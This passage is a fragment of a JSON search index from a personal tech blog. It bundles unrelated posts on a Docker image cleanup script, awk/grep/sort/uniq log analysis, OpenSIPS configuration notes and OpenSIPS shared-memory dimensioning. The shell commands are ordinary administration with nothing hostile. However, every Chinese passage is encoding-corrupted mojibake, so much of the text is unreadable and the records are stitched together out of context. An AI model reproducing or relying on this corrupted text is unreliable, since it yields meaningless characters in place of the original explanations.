\u0026#34;max_free_disk: $max_free_disk G\u0026#34; echo -e \u0026#34;current_free_disk: ${GREEN} $current_free_disk G ${NC}\u0026#34; if [ $current_free_disk -lt $max_free_disk ] then echo -e \u0026#34;${RED} need to clean up docker images ${NC}\u0026#34; docker images | grep none | awk \u0026#39;{print $3 }\u0026#39; | xargs docker rmi docker images | grep wecloud | awk \u0026#39;{print $1\u0026#34;:\u0026#34;$2}\u0026#39; | xargs docker rmi else echo -e \u0026#34;${GREEN}no need clean${NC}\u0026#34; fi æ³¨æ„äº‹é¡¹ ä¸ºäº†åŠ å¿«æ‰“åŒ…çš„é€Ÿåº¦ï¼Œä¸€èˆ¬ä¸è¦å¤ªé¢‘ç¹çš„åˆ é™¤é•œåƒã€‚å› ä¸ºè€çš„é•œåƒä¸­çš„æŸäº›ä¸æ”¹å˜çš„å±‚ï¼Œå¯ä»¥ä½œä¸ºæ–°çš„é•œåƒçš„ç¼“å­˜ï¼Œä»è€Œå¤§å¤§åŠ å¿«æ„å»ºçš„é€Ÿåº¦ã€‚\n","permalink":"https://wdd.js.org/shell/docker-clean-tips/","summary":"ä½¿ç”¨ jenkins ä½œä¸ºæ‰“åŒ…çš„å·¥å…·ï¼Œä¸»æœºä¸Šçš„ç£ç›˜ç©ºé—´æ€»æ˜¯è¢«æ…¢æ…¢è¢«å æ»¡ï¼Œç›´åˆ° jenkins æ— æ³•è¿è¡Œã€‚æœ¬æ–‡ä»å‡ ä¸ªæ–¹é¢æ¥æ¸…ç† docker åƒåœ¾ã€‚\næ‰¹é‡åˆ é™¤å·²ç»é€€å‡ºçš„å®¹å™¨ docker ps -a | grep \u0026#34;Exited\u0026#34; | awk \u0026#39;{print $1 }\u0026#39; | xargs docker rm æ‰¹é‡åˆ é™¤å¸¦æœ‰ none å­—æ®µçš„é•œåƒ $3 ä¸€èˆ¬å°±æ˜¯å–å‡ºæ¯ä¸€è¡Œçš„é•œåƒ id å­—æ®µ\n# æ–¹æ¡ˆ1ï¼š æ ¹æ®é•œåƒidåˆ é™¤é•œåƒ docker images| grep none |awk \u0026#39;{print $3 }\u0026#39;|xargs docker rmi # æ–¹æ¡ˆ2: æ ¹æ®é•œåƒååˆ é™¤é•œåƒ docker images | grep wecloud | awk \u0026#39;{print $1\u0026#34;:\u0026#34;$2}\u0026#39; | xargs docker rmi æ–¹æ¡ˆ 1ï¼Œæ ¹æ®é•œåƒ ID åˆ é™¤é•œåƒæ—¶ï¼Œæœ‰å†™é•œåƒè™½ç„¶é•œåƒåä¸åŒï¼Œä½†æ˜¯é•œåƒ ID éƒ½æ˜¯ç›¸åŒçš„ï¼Œè¿™æ˜¯åå¾€å¾€ä¼šåˆ é™¤å¤±è´¥ã€‚æ‰€ä»¥æ ¹æ®é•œåƒååˆ é™¤é•œåƒçš„æ•ˆæœä¼šæ›´å¥½ã€‚\nåˆ é™¤é•œåƒå®šæ—¶ä»»åŠ¡è„šæœ¬ #!/bin/bash # create by wangduanduan # when current free disk less then max free disk, you can remove docker images # GREEN=\u0026#39;\\033[0;32m\u0026#39; RED=\u0026#39;\\033[0;31m\u0026#39; NC=\u0026#39;\\033[0m\u0026#39; max_free_disk=5 # 5G.","title":"Dockeré•œåƒæ‰¹é‡æ¸…ç†è„šæœ¬"},{"content":"test.log\n2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.1 cause:\u0026#34;BBB\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;S\u0026#34; loginIn 2019-1010-1920 192.345.23.1 cause:\u0026#34;BBJ\u0026#34; type:\u0026#34;A\u0026#34; loginIn æŒ‰åˆ—åˆ†å‰² æå–ç¬¬ä¸‰åˆ—æ—¥å¿—åˆ—æ•°æ¯”è¾ƒå°‘æˆ–åˆ™è¦æå–çš„å­—æ®µæ¯”è¾ƒé å‰æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨ awkã€‚å½“ç„¶ cut ä¹Ÿå¯ä»¥åšåˆ°ã€‚æ¯”å¦‚è¾“å‡ºæ—¥å¿—çš„ç¬¬ä¸‰åˆ—\nawk \u0026#39;{print $3}\u0026#39; test.log // $3è¡¨ç¤ºç¬¬ä¸‰åˆ— cut -d \u0026#34; \u0026#34; -f3 test.log // -f3æŒ‡å®šç¬¬ä¸‰åˆ—, -dç”¨æ¥æŒ‡å®šåˆ†å‰²ç¬¦ æ­£åˆ™æå– æå– cause å­—æ®µçš„åŸå› å€¼ï¼Ÿ\n2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.1 type:\u0026#34;A\u0026#34; loginIn cause:\u0026#34;BBB\u0026#34; 2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;S\u0026#34; loginIn 2019-1010-1920 192.345.23.1 type:\u0026#34;A\u0026#34; cause:\u0026#34;BBJ\u0026#34; loginIn å½“è¦æå–çš„å†…å®¹ä¸åœ¨åŒä¸€åˆ—æ—¶ï¼Œå¾€å¾€å°±æ— æ³•ç”¨cutæˆ–è€…awkå°±æŒ‰åˆ—æå–ã€‚æœ€å¥½ç”¨çš„æ–¹å¼æ˜¯ç”¨ grep çš„æ­£åˆ™æå–ã€‚å¥½åƒ grep ä¸æ”¯æŒæ•è·åˆ†ç»„ï¼Œæ‰€ä»¥åªèƒ½æå–å‡ºå‡º cause:\u0026ldquo;AAA\u0026rdquo;ï¼Œè€Œæ— æ³•ç›´æ¥æå–å‡º AAA\nE è¡¨ç¤ºä½¿ç”¨æ­£åˆ™ o è¡¨ç¤ºåªæ˜¾ç¤ºåŒ¹é…åˆ°çš„å†…å®¹ \u0026gt; grep -Eo \u0026#39;cause:\u0026#34;.*?\u0026#34;\u0026#39; test.log cause:\u0026#34;AAA\u0026#34; cause:\u0026#34;BBB\u0026#34; cause:\u0026#34;AAA\u0026#34; cause:\u0026#34;BBJ\u0026#34; ç»Ÿè®¡ å¯¹è¾“å‡ºçš„å…³é”®è¯è¿›è¡Œç»Ÿè®¡ï¼Œå¹¶æŒ‰ç…§å‡åºæˆ–è€…é™åºæ’åˆ—ã€‚å°†å…³é”®è¯æŒ‰ç…§åˆ—æˆ–è€…æŒ‰ç…§æ­£åˆ™æå–å‡ºæ¥ä¹‹åï¼Œé¦–å…ˆè¦è¿›è¡Œsortæ’åº, ç„¶åå†è¿›è¡Œuniqå»é‡ã€‚ä¸è¿›è¡Œæ’åºå°±ç›´æ¥å»é‡ï¼Œç»Ÿè®¡çš„å€¼å°±ä¸å‡†ç¡®ã€‚å› ä¸º uniq å»é‡åªèƒ½å»é™¤è¿ç»­çš„ç›¸åŒå­—ç¬¦ä¸²ã€‚ä¸æ˜¯è¿ç»­çš„å­—ç¬¦ä¸²ï¼Œåˆ™ä¼šç»Ÿè®¡å¤šæ¬¡ã€‚ä¸‹é¢ä¾‹å­ï¼šéè¿ç»­çš„ cause:\u0026ldquo;AAA\u0026rdquo;ï¼Œæ²¡æœ‰è¢«åˆå¹¶åœ¨ä¸€èµ·è®¡æ•°\n// bad grep -Eo \u0026#39;cause:\u0026#34;.*?\u0026#34;\u0026#39; test.log | uniq -c 1 cause:\u0026#34;AAA\u0026#34; 1 cause:\u0026#34;BBB\u0026#34; 1 cause:\u0026#34;AAA\u0026#34; 1 cause:\u0026#34;BBJ\u0026#34; // good AAA è¢«æ­£ç¡®ç»Ÿè®¡äº† grep -Eo \u0026#39;cause:\u0026#34;.*?\u0026#34;\u0026#39; test.log | sort | uniq -c 2 cause:\u0026#34;AAA\u0026#34; 1 cause:\u0026#34;BBB\u0026#34; 1 cause:\u0026#34;BBJ\u0026#34; å¯¹ç»Ÿè®¡å€¼æ’åº sort é»˜è®¤çš„æ’åºæ˜¯æŒ‰ç…§å­—å…¸æ’åº, å¯ä»¥ä½¿ç”¨-n å‚æ•°è®©å…¶æŒ‰ç…§æ•°å€¼å¤§å°æ’åºã€‚\nn æŒ‰ç…§æ•°å€¼æ’åº r å–åã€‚sort æŒ‰ç…§æ•°å€¼æ’åºæ˜¯ï¼Œé»˜è®¤æ˜¯å‡åºï¼Œå¦‚æœæƒ³è¦ç»“æœé™åºï¼Œé‚£ä¹ˆéœ€è¦-r -k -k å¯ä»¥æŒ‡å®šæŒ‰ç…§æŸåˆ—çš„æ•°å€¼é¡ºåºæ’åºï¼Œå¦‚-k1,1(æŒ‡å®šç¬¬ä¸€åˆ—)ï¼Œ -k2,2(æŒ‡å®šç¬¬äºŒåˆ—)ã€‚å¦‚æœä¸æŒ‡å®š-k å‚æ•°ï¼Œé‚£ä¹ˆä¸€èˆ¬é»˜è®¤ç¬¬ä¸€åˆ—ã€‚ // å‡åºæ’åº grep -Eo \u0026#39;cause:\u0026#34;.*?\u0026#34;\u0026#39; test.log | sort |uniq -c | sort -n 1 cause:\u0026#34;BBB\u0026#34; 1 cause:\u0026#34;BBJ\u0026#34; 2 cause:\u0026#34;AAA\u0026#34; // é™åºæ’åº grep -Eo \u0026#39;cause:\u0026#34;.*?\u0026#34;\u0026#39; test.log | sort |uniq -c | sort -nr 2 cause:\u0026#34;AAA\u0026#34; 1 cause:\u0026#34;BBJ\u0026#34; 1 cause:\u0026#34;BBB\u0026#34; ","permalink":"https://wdd.js.org/shell/log-ana/","summary":"test.log\n2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.1 cause:\u0026#34;BBB\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;S\u0026#34; loginIn 2019-1010-1920 192.345.23.1 cause:\u0026#34;BBJ\u0026#34; type:\u0026#34;A\u0026#34; loginIn æŒ‰åˆ—åˆ†å‰² æå–ç¬¬ä¸‰åˆ—æ—¥å¿—åˆ—æ•°æ¯”è¾ƒå°‘æˆ–åˆ™è¦æå–çš„å­—æ®µæ¯”è¾ƒé å‰æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨ awkã€‚å½“ç„¶ cut ä¹Ÿå¯ä»¥åšåˆ°ã€‚æ¯”å¦‚è¾“å‡ºæ—¥å¿—çš„ç¬¬ä¸‰åˆ—\nawk \u0026#39;{print $3}\u0026#39; test.log // $3è¡¨ç¤ºç¬¬ä¸‰åˆ— cut -d \u0026#34; \u0026#34; -f3 test.log // -f3æŒ‡å®šç¬¬ä¸‰åˆ—, -dç”¨æ¥æŒ‡å®šåˆ†å‰²ç¬¦ æ­£åˆ™æå– æå– cause å­—æ®µçš„åŸå› å€¼ï¼Ÿ\n2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.1 type:\u0026#34;A\u0026#34; loginIn cause:\u0026#34;BBB\u0026#34; 2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;S\u0026#34; loginIn 2019-1010-1920 192.345.23.1 type:\u0026#34;A\u0026#34; cause:\u0026#34;BBJ\u0026#34; loginIn å½“è¦æå–çš„å†…å®¹ä¸åœ¨åŒä¸€åˆ—æ—¶ï¼Œå¾€å¾€å°±æ— æ³•ç”¨cutæˆ–è€…awkå°±æŒ‰åˆ—æå–ã€‚æœ€å¥½ç”¨çš„æ–¹å¼æ˜¯ç”¨ grep çš„æ­£åˆ™æå–ã€‚å¥½åƒ grep ä¸æ”¯æŒæ•è·åˆ†ç»„ï¼Œæ‰€ä»¥åªèƒ½æå–å‡ºå‡º cause:\u0026ldquo;AAA\u0026rdquo;ï¼Œè€Œæ— æ³•ç›´æ¥æå–å‡º AAA","title":"awkã€grepã€cutã€sortã€uniqç®€å•å‘½ä»¤ç©è½¬æ—¥å¿—åˆ†æä¸ç»Ÿè®¡"},{"content":"ifè¯­å¥ä¸­çš„çœŸå’Œå‡å€¼ å‡å€¼\nè´Ÿæ•°: -1, -2, -3, -4 null: hdr(not_exist) ç„¶è€Œè¿™ä¸ªnot_existå¤´å¹¶ä¸å­˜åœ¨ \u0026ldquo;\u0026rdquo;: ç©ºå­—ç¬¦ä¸² 0 çœŸå€¼ï¼š\néç©ºå­—ç¬¦ä¸²: \u0026ldquo;acb\u0026rdquo; æ­£æ•°: 1,2,3 ","permalink":"https://wdd.js.org/opensips/ch5/condition/","summary":"ifè¯­å¥ä¸­çš„çœŸå’Œå‡å€¼ å‡å€¼\nè´Ÿæ•°: -1, -2, -3, -4 null: hdr(not_exist) ç„¶è€Œè¿™ä¸ªnot_existå¤´å¹¶ä¸å­˜åœ¨ \u0026ldquo;\u0026rdquo;: ç©ºå­—ç¬¦ä¸² 0 çœŸå€¼ï¼š\néç©ºå­—ç¬¦ä¸²: \u0026ldquo;acb\u0026rdquo; æ­£æ•°: 1,2,3 ","title":"æ¡ä»¶è¯­å¥ç‰¹ç‚¹"},{"content":" å°†opensips.cfgæ–‡ä»¶ä¸­çš„ï¼Œlog_stderrorçš„å€¼æ”¹ä¸ºyes, è®©å‡ºé”™ç›´æ¥è¾“å‡ºåˆ°æ ‡å‡†é”™è¯¯æµä¸Šï¼Œç„¶åopensips start å¦‚æœç¬¬ä¸€æ­¥è¿˜æ˜¯æ²¡æœ‰æ—¥å¿—è¾“å‡ºï¼Œåˆ™opensips -f opensips.cfg ","permalink":"https://wdd.js.org/opensips/ch7/without-log/","summary":" å°†opensips.cfgæ–‡ä»¶ä¸­çš„ï¼Œlog_stderrorçš„å€¼æ”¹ä¸ºyes, è®©å‡ºé”™ç›´æ¥è¾“å‡ºåˆ°æ ‡å‡†é”™è¯¯æµä¸Šï¼Œç„¶åopensips start å¦‚æœç¬¬ä¸€æ­¥è¿˜æ˜¯æ²¡æœ‰æ—¥å¿—è¾“å‡ºï¼Œåˆ™opensips -f opensips.cfg ","title":"opensipså¯åŠ¨å¤±è´¥æ²¡æœ‰ä»»ä½•æŠ¥é”™æ—¥å¿—"},{"content":"è™šæ‹ŸåŒ– é—®é¢˜ï¼š\næ“ä½œç³»ç»Ÿå¦‚ä½•è™šæ‹ŸåŒ–? è™šæ‹ŸåŒ–æœ‰ä»€ä¹ˆå¥½å¤„? æ“ä½œç³»ç»Ÿå‘ä¸‹æ§åˆ¶ç¡¬ä»¶ï¼Œå‘ä¸Šæä¾›APIç»™åº”ç”¨ç¨‹åºè°ƒç”¨ã€‚Â ç³»ç»Ÿçš„èµ„æºæ˜¯æœ‰é™çš„ï¼Œåº”ç”¨ç¨‹åºéƒ½éœ€è¦èµ„æºæ‰èƒ½æ­£å¸¸è¿è¡Œï¼Œæ‰€ä»¥æ“ä½œç³»ç»Ÿä¹Ÿè¦è´Ÿè´£èµ„æºçš„åˆ†é…å’Œåè°ƒã€‚é€šå¸¸è®¡ç®—æœºæœ‰ä»¥ä¸‹çš„èµ„æºã€‚\ncpu å†…å­˜ ç£ç›˜ ç½‘ç»œ æœ‰äº›èµ„æºå¯ä»¥è½®æµä½¿ç”¨ï¼Œè€Œæœ‰äº›èµ„æºåªèƒ½è¢«ç‹¬å ä½¿ç”¨ã€‚\n","permalink":"https://wdd.js.org/posts/2019/08/ym77uc/","summary":"è™šæ‹ŸåŒ– é—®é¢˜ï¼š\næ“ä½œç³»ç»Ÿå¦‚ä½•è™šæ‹ŸåŒ–? è™šæ‹ŸåŒ–æœ‰ä»€ä¹ˆå¥½å¤„? æ“ä½œç³»ç»Ÿå‘ä¸‹æ§åˆ¶ç¡¬ä»¶ï¼Œå‘ä¸Šæä¾›APIç»™åº”ç”¨ç¨‹åºè°ƒç”¨ã€‚Â ç³»ç»Ÿçš„èµ„æºæ˜¯æœ‰é™çš„ï¼Œåº”ç”¨ç¨‹åºéƒ½éœ€è¦èµ„æºæ‰èƒ½æ­£å¸¸è¿è¡Œï¼Œæ‰€ä»¥æ“ä½œç³»ç»Ÿä¹Ÿè¦è´Ÿè´£èµ„æºçš„åˆ†é…å’Œåè°ƒã€‚é€šå¸¸è®¡ç®—æœºæœ‰ä»¥ä¸‹çš„èµ„æºã€‚\ncpu å†…å­˜ ç£ç›˜ ç½‘ç»œ æœ‰äº›èµ„æºå¯ä»¥è½®æµä½¿ç”¨ï¼Œè€Œæœ‰äº›èµ„æºåªèƒ½è¢«ç‹¬å ä½¿ç”¨ã€‚","title":"ã€ç¬”è®°ã€‘æ“ä½œç³»ç»Ÿï¼šè™šæ‹ŸåŒ– å¹¶å‘ æŒä¹…åŒ–"},{"content":" å¤„ç†é—®é¢˜çš„å…³é”®åœ¨äºæ”¶é›†æ•°æ®ï¼ŒåŸºäºæ•°æ®æ‰¾å‡ºè§¦å‘æ¡ä»¶ã€‚\n1. å¤„ç†æ­¥éª¤ æ”¶é›†ä¿¡æ¯å¹¶è®°å½•ï¼šåŒ…æ‹¬æ—¥å¿—ï¼Œæˆªå›¾ï¼ŒæŠ“åŒ…ï¼Œå®¢æˆ·åé¦ˆç­‰ç­‰ã€‚æ³¨æ„ï¼šåŸå§‹æ•°æ®éå¸¸é‡è¦ï¼Œå¦‚æœä¸è®°å½•ä¸‹æ¥ï¼Œæœ‰å¯èƒ½å†ä¹Ÿæ— æ³•å»é‡ç°ã€‚ åˆ†ææ•°æ®ï¼šæ³¨æ„ï¼šåˆ†ææ•°æ®ä¸è¦æœ‰æå‰çš„ç»“æœå€¾å‘ï¼Œå¦è€…åªä¼šæ‰¾æœ‰åˆ©äºè¯¥å€¾å‘çš„è¯æ®ã€‚ ç»™å‡ºæŠ¥å‘Šå’Œå»ºè®®ï¼Œä»¥åŠè§£å†³æ–¹æ¡ˆï¼Œå¹¶è®°å½•å­˜æ¡£ 2. æ¦‚ç‡ç»´åº¦ é—®é¢˜å‡ºç°çš„æ¦‚ç‡ï¼Œæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æŒ‡æ ‡ï¼Œéœ€è¦æå‰æ˜ç¡®\nå¿…ç„¶å‡ºç°ï¼šåœ¨æŸä¸ªæ¡ä»¶ä¸‹ï¼Œé—®é¢˜å¿…ç„¶å‡ºç° æ³¨æ„ï¼šå¿…ç„¶å‡ºç°çš„é—®é¢˜ï¼Œä¹Ÿå¯èƒ½æ˜¯å°èŒƒå›´å†…çš„å¿…ç„¶ï¼Œæ”¾åˆ°å¤§èŒƒå›´å†…ï¼Œå°±ä¸æ˜¯å¿…ç„¶å‡ºç°ã€‚ å¶ç„¶å‡ºç°ï¼šé—®é¢˜å‡ºç°æœ‰ä¸€å®šçš„æ¦‚ç‡æ€§ æ³¨æ„ï¼šé—®é¢˜å¶ç„¶å‡ºç°ä¹Ÿå¹¶ä¸ä¸€å®šè¯´æ˜é—®é¢˜æ˜¯å¶ç„¶çš„ï¼Œæœ‰å¯èƒ½å› ä¸ºæ²¡æœ‰æ‰¾åˆ°å”¯ä¸€ç¡®å®šçš„è§¦å‘æ¡ä»¶ï¼Œå¯¼è‡´é—®é¢˜çœ‹èµ·æ¥æ˜¯å¶ç„¶çš„ã€‚ 3. ç‰¹å¾ç»´åº¦ æ—¶é—´ç‰¹å¾ï¼šé›†ä¸­äºæŸä¸€æ®µæ—¶é—´äº§ç”Ÿ åœ°ç†ç‰¹å¾ï¼šé›†ä¸­äºæŸä¸€ç‰‡åŒºåŸŸäº§ç”Ÿ äººç¾¤ç‰¹å¾ï¼šé›†ä¸­äºæŸå‡ ä¸ªäººäº§ç”Ÿ è®¾å¤‡ç‰¹å¾ï¼šé›†ä¸­äºæŸäº›ç”µè„‘æˆ–è€…å®¢æˆ·ç«¯ ","permalink":"https://wdd.js.org/posts/2019/08/vqergg/","summary":" å¤„ç†é—®é¢˜çš„å…³é”®åœ¨äºæ”¶é›†æ•°æ®ï¼ŒåŸºäºæ•°æ®æ‰¾å‡ºè§¦å‘æ¡ä»¶ã€‚\n1. å¤„ç†æ­¥éª¤ æ”¶é›†ä¿¡æ¯å¹¶è®°å½•ï¼šåŒ…æ‹¬æ—¥å¿—ï¼Œæˆªå›¾ï¼ŒæŠ“åŒ…ï¼Œå®¢æˆ·åé¦ˆç­‰ç­‰ã€‚æ³¨æ„ï¼šåŸå§‹æ•°æ®éå¸¸é‡è¦ï¼Œå¦‚æœä¸è®°å½•ä¸‹æ¥ï¼Œæœ‰å¯èƒ½å†ä¹Ÿæ— æ³•å»é‡ç°ã€‚ åˆ†ææ•°æ®ï¼šæ³¨æ„ï¼šåˆ†ææ•°æ®ä¸è¦æœ‰æå‰çš„ç»“æœå€¾å‘ï¼Œå¦è€…åªä¼šæ‰¾æœ‰åˆ©äºè¯¥å€¾å‘çš„è¯æ®ã€‚ ç»™å‡ºæŠ¥å‘Šå’Œå»ºè®®ï¼Œä»¥åŠè§£å†³æ–¹æ¡ˆï¼Œå¹¶è®°å½•å­˜æ¡£ 2. æ¦‚ç‡ç»´åº¦ é—®é¢˜å‡ºç°çš„æ¦‚ç‡ï¼Œæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æŒ‡æ ‡ï¼Œéœ€è¦æå‰æ˜ç¡®\nå¿…ç„¶å‡ºç°ï¼šåœ¨æŸä¸ªæ¡ä»¶ä¸‹ï¼Œé—®é¢˜å¿…ç„¶å‡ºç° æ³¨æ„ï¼šå¿…ç„¶å‡ºç°çš„é—®é¢˜ï¼Œä¹Ÿå¯èƒ½æ˜¯å°èŒƒå›´å†…çš„å¿…ç„¶ï¼Œæ”¾åˆ°å¤§èŒƒå›´å†…ï¼Œå°±ä¸æ˜¯å¿…ç„¶å‡ºç°ã€‚ å¶ç„¶å‡ºç°ï¼šé—®é¢˜å‡ºç°æœ‰ä¸€å®šçš„æ¦‚ç‡æ€§ æ³¨æ„ï¼šé—®é¢˜å¶ç„¶å‡ºç°ä¹Ÿå¹¶ä¸ä¸€å®šè¯´æ˜é—®é¢˜æ˜¯å¶ç„¶çš„ï¼Œæœ‰å¯èƒ½å› ä¸ºæ²¡æœ‰æ‰¾åˆ°å”¯ä¸€ç¡®å®šçš„è§¦å‘æ¡ä»¶ï¼Œå¯¼è‡´é—®é¢˜çœ‹èµ·æ¥æ˜¯å¶ç„¶çš„ã€‚ 3. ç‰¹å¾ç»´åº¦ æ—¶é—´ç‰¹å¾ï¼šé›†ä¸­äºæŸä¸€æ®µæ—¶é—´äº§ç”Ÿ åœ°ç†ç‰¹å¾ï¼šé›†ä¸­äºæŸä¸€ç‰‡åŒºåŸŸäº§ç”Ÿ äººç¾¤ç‰¹å¾ï¼šé›†ä¸­äºæŸå‡ ä¸ªäººäº§ç”Ÿ è®¾å¤‡ç‰¹å¾ï¼šé›†ä¸­äºæŸäº›ç”µè„‘æˆ–è€…å®¢æˆ·ç«¯ ","title":"é—®é¢˜æ’æŸ¥æ–¹æ³•è®º"},{"content":"åŸæ–‡ï¼šhttps://blog.opensips.org/2016/12/29/understanding-and-dimensioning-memory-in-opensips/\nRunning OpenSIPS with the right memory configuration is a very important task when developing and maintaining your VoIP service, because it has a direct effect over the scale of your platform, the customers you support, as well as the services you offer. Setting the limit to a low value might make OpenSIPS run out of memory during high volume of traffic, or during complex scenarios, while setting a big value might lead to wasted resources.\nå†…å­˜å¤ªå°ä¼šå¯¼è‡´OOM, å†…å­˜å¤§å¤§æœ‰ä¼šæµªè´¹\nUnfortunately picking this limit is not something that can be easily determined by a magic formula. The reason is that memory consumption is often influenced by a lot of external factors, like calling scenarios, traffic patterns, provisioned data, interactions with other external components (like AAA or DB servers), etc. Therefore, the only way to properly dimension the memory OpenSIPS is allowed to use is by monitoring memory usage, understanding the memory footprint and tuning this value accordingly. This article provides a few tips to achieve this goal.\né¦–å…ˆç›‘æ§opensipsçš„å†…å­˜ä½¿ç”¨ï¼Œç„¶åæ ¹æ®ç›‘æ§çš„å€¼è°ƒæ•´åˆé€‚çš„å†…å­˜å¤§å°\nOpenSIPSå†…éƒ¨çš„å†…å­˜ä½¿ç”¨ opensipsæ˜¯ä¸ªå¤šè¿›ç¨‹ç¨‹åºå¹¶ä½¿ç”¨ä¸¤ç§å†…å­˜æ¨¡å‹\nç§æœ‰å†…å­˜: è¿›ç¨‹ç‹¬å çš„å†…å­˜ï¼Œå¾€å¾€æ¯”è¾ƒå° å…±äº«å†…å­˜: opensipsæ¨¡å—ä½¿ç”¨çš„å†…å­˜ï¼Œå¾€å¾€æ¯”è¾ƒå¤§ To understand the wayÂ OpenSIPSÂ uses the available memory, we have to point out thatÂ OpenSIPSÂ is aÂ multi-processÂ application thatÂ uses two types of memory: private and shared. Each process has its own private memory space and uses it to store local data, that does not need to be shared with other processes (i.e. parsing data). Most of the time the amount of private memory used is small, and usually fits into the default value of 2MB per process. Nevertheless understanding the way private memory is used is also necessary in order to properly dimension your platformâ€™s memory.On the other hand, shared memory is a big memory pool that is shared among all processes. This is the memory usedÂ byÂ OpenSIPSÂ modules to store data used at run-time, and in most of the cases, the default value of 16MB is not enough. As I stated earlier, it is impossible to pick a â€œmagicâ€ value for this limit, mostly because there are a lot of considerations that affect it. The data stored in the shared memory can be classified in two categories:\næµé‡æ•°æ®ï¼š1. æ³¨å†Œç›¸å…³çš„æ•°æ®ï¼›2. å‘¼å«ç›¸å…³çš„æ•°æ®ï¼Œtmå’Œdaillog ä¸´æ—¶æ•°æ®ï¼šæ•°æ®åº“ç¼“å­˜æ•°æ®\nTraffic data â€“ data generated by your customers registration data, managed by theÂ usrlocÂ module, is directly linked to the number of customers registered into the platform; call data, managed by theÂ tmÂ andÂ dialogÂ modules, is related to the number of simultaneous calls done through the platform. Provisioning data â€“ data cached from the database, used to implement the platformâ€™s logic. The amount of memory used by each of this data may vary according to the services you offer, your customer base and their traffic.\nç›‘æ§å†…å­˜ä½¿ç”¨ æœ‰ä¸¤ç§æ–¹å¼ç›‘æ§å†…å­˜\nOpensips CPï¼Œè¿™ä¸ªå·¥å…·æ¯”è¾ƒæ–¹ä¾¿ï¼Œä½†æ˜¯å®‰è£…æ¯”è¾ƒè´Ÿè½½ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨ é€šè¿‡opensipsçš„fifoæŒ‡ä»¤å»è·å–å†…å­˜ã€‚è¿™ä¸ªæ¯”è¾ƒæ–¹ä¾¿ï¼Œå¯ä»¥åšæˆcrontab, ç„¶åå‘¨æœŸæ€§çš„å†™å…¥åˆ°influxdbã€‚ There are two ways to monitorÂ OpenSIPSÂ memory statistics:\nfromÂ OpenSIPS CPÂ Web GUI, using the statistics interface (Image 1) from cli using theÂ opensipsctlÂ tool: opensipsctl fifo get_statistics shmem: shmem:total_size:: 268435456 shmem:used_size:: 124220488 shmem:real_used_size:: 170203488 shmem:max_used_size:: 196065104 shmem:free_size:: 98231968 shmem:fragments:: 474863 From both you can observe 6 values:\ntotal_size: the total amount of memory provisioned used_size: the amount of memory required to store the data real_used_size: the total amount of memory required to store data and metadata max_used_size: the maximum amount of memory used sinceÂ OpenSIPSÂ started free_size: the amount of free memory fragments: the number of fragments When monitoring memory usage, the most important statistics are theÂ max_used_sizeÂ , because it indicates the minimum valueÂ OpenSIPSÂ needs to support the traffic that has been so far and theÂ real_used_size, because it indicates the memory used at a specific moment. We will use these metrics further on.\nç†è§£å†…å­˜ä½¿ç”¨ In order to have a better understanding about the memory used, we will take as an example a very specific platform: an outbound PSTN gateway, that is designed to support 500Â CPS (calls per second) from customers and dispatch them to approximatelyÂ 100KÂ prefixes, cached by theÂ droutingÂ module. You can see the platformâ€™s topology in this picture:\nTo figure out what happens in the scenario Image 1 presents, we will extract theÂ real_used_size,Â max_used_sizeÂ andÂ actve_dialogsÂ statistics:\nAs you can observe, at the beginning of the chart, the memory usage was low, close to 0. That is most likely OpenSIPS startup. Then, it grows quickly until around 60MB. That isÂ OpenSIPSÂ loading the 100K of prefixes into theÂ droutingÂ module cache. Next, as we can see in theÂ **active_dialogsÂ **statistic, traffic comes in in batches. ThereforeÂ OpenSIPSÂ memory usage increases gradually, until around 170MB and stabilizes with the call-flow. After a while, the dialog numbers start to decrease, and the memory is again gradually released, until it ends to the idle memory of 60MB used by theÂ droutingÂ cache.Taking a closer look at the charts, you will notice two awkward things in the second half of the period:\ndialogå ç”¨çš„å†…å­˜å¹¶ä¸æ˜¯å‘¼å«ç»“æŸåç«‹å³é‡Šæ”¾ï¼Œè€Œæ˜¯ç”±è®¡æ—¶å™¨å»å»¶æ—¶å‘¨æœŸæ€§çš„æŒ‰æ‰¹æ¬¡å»é‡Šæ”¾ SIPäº‹åŠ¡ä¹Ÿä¸æ˜¯ä¼šéº»çƒ¦é‡Šæ”¾ï¼Œè€Œæ˜¯ä¼šç­‰å¾…å»è€—å°½ç½‘ç»œä¸­æ‰€æœ‰çš„é‡ä¼ æ¶ˆæ¯\nopensipsçš„å¾ˆå¤šæ¨¡å—å¾€å¾€éœ€è¦ä¸€æ¬¡æ€§çš„æŠŠæ•°æ®åº“ä¸­çš„æ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ã€‚è€Œåœ¨æ¨¡å—reloadçš„æ—¶å€™ï¼Œå†…å­˜ä¸­ä¼šåŒæ—¶å­˜åœ¨ä¸¤ä»½æ•°æ®ã€‚ç›´åˆ°æ–°çš„æ•°æ®å®Œå…¨åŠ è½½å®Œæ¯•åï¼Œè€çš„æ•°æ®å 